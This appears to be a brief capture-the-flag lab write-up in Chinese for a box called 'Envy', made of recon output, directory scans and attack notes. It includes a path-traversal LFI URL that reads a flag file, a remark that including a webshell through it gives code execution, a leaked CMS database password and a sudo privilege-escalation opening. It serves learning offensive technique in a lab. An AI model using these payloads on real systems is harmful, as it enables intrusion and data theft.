# Envy

## 信息收集

```bash
Detected ss and lsof, executing related commands...
Port: 53, PID: 720
—> Command: /lib/systemd/systemd-resolved 
Port: 22, PID: 923
—> Command: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
Port: 33060, PID: 1069
—> Command: /usr/sbin/mysqld 
Port: 3306, PID: 1069
—> Command: /usr/sbin/mysqld 

## ———————————————————————————— ##

Nginx is not installed.

## ———————————————————————————— ##

Detected apache, analyzing its configuration...
Device "eth0" does not exist.

Unique Hosts:


## ———————————————————————————— ##

Checking /etc/sudoers (active configurations only):
  Defaults      env_reset
  Defaults      mail_badpass
  Defaults      secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
  root  ALL=(ALL:ALL) ALL
  www-data ALL=(ALL:ALL) NOPASSWD:SETENV:/usr/bin/python* /opt/time_check.py
  %admin ALL=(ALL) ALL
  %sudo ALL=(ALL:ALL) ALL
———
Finding SUID files:
  root  ALL=(ALL:ALL) ALL
  www-data ALL=(ALL:ALL) NOPASSWD:SETENV:/usr/bin/python* /opt/time_check.py
  %admin ALL=(ALL) ALL
  %sudo ALL=(ALL:ALL) ALL
———
Finding files with special capabilities:
  /snap/core20/1376/usr/bin/ping = cap_net_raw+ep
  /snap/core20/1405/usr/bin/ping = cap_net_raw+ep
  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
  /usr/bin/ping = cap_net_raw+ep
  /usr/bin/mtr-packet = cap_net_raw+ep
  /usr/bin/traceroute6.iputils = cap_net_raw+ep
———
```

## http 80 目录扫描

```plaintext
[12:13:32] 301 -  314B  - /admin  ->  http://10.10.110.101/admin/
[12:13:33] 302 -    0B  - /admin/  ->  http://10.10.110.101/admin/login.php
[12:13:33] 302 -    0B  - /admin/?/login  ->  http://10.10.110.101/admin/login.php
[12:13:33] 302 -    0B  - /admin/index.php  ->  http://10.10.110.101/admin/login.php
[12:13:34] 200 -    4KB - /admin/login.php
[12:13:46] 200 -    2KB - /assets/
[12:13:46] 301 -  315B  - /assets  ->  http://10.10.110.101/assets/
[12:13:53] 200 -    0B  - /config.php
[12:13:58] 200 -   24B  - /doc/
[12:13:58] 301 -  312B  - /doc  ->  http://10.10.110.101/doc/
[12:14:07] 200 -   19KB - /index.php
[12:14:10] 301 -  312B  - /lib  ->  http://10.10.110.101/lib/
[12:14:10] 200 -   24B  - /lib/
[12:14:15] 301 -  316B  - /modules  ->  http://10.10.110.101/modules/
[12:14:15] 200 -    3KB - /modules/
[12:14:27] 403 -  278B  - /server-status/
[12:14:27] 403 -  278B  - /server-status
[12:14:34] 301 -  312B  - /tmp  ->  http://10.10.110.101/tmp/
[12:14:34] 200 -    1KB - /tmp/
[12:14:36] 301 -  316B  - /uploads  ->  http://10.10.110.101/uploads/
[12:14:36] 200 -    0B  - /uploads/
```

## http 8080 目录扫描

```plaintext
[12:10:18] 200 -    1KB - /LICENSE.txt
[12:10:24] 200 -   22KB - /about.html
[12:10:49] 200 -   14KB - /contact.html
[12:10:50] 301 -  319B  - /css  ->  http://10.10.110.101:8080/css/
[12:11:00] 301 -  319B  - /img  ->  http://10.10.110.101:8080/img/
[12:11:01] 302 -    0B  - /index.php  ->  index.php?page=index.html
[12:11:01] 302 -    0B  - /index.php/login/  ->  index.php?page=index.html
[12:11:02] 200 -   46KB - /index.html
[12:11:03] 200 -  931B  - /js/
[12:11:04] 301 -  319B  - /lib  ->  http://10.10.110.101:8080/lib/
[12:11:04] 200 -    2KB - /lib/
[12:11:07] 301 -  320B  - /mail  ->  http://10.10.110.101:8080/mail/
[12:11:07] 200 -    1KB - /mail/
```

## http 80 cms config

```php
<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms'] = 'mysqli';
$config['db_hostname'] = 'localhost';
$config['db_username'] = 'db_admin';
$config['db_password'] = 'ThisIsAVerySecurePassword123!';
$config['db_name'] = 'cmsms';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'UTC';
?>
```

## Port 8080 LFI

```plaintext
http://10.10.110.102:8080/index.php?page=../../../../opt/flag.txt
```

顺便包含一个 webshell 上去就能 rce

## Port 80 SimpleCMS 命令执行 可能

```plaintext
Simple v2.2.15 远程命令执行漏洞(CVE-2022-23906)
```
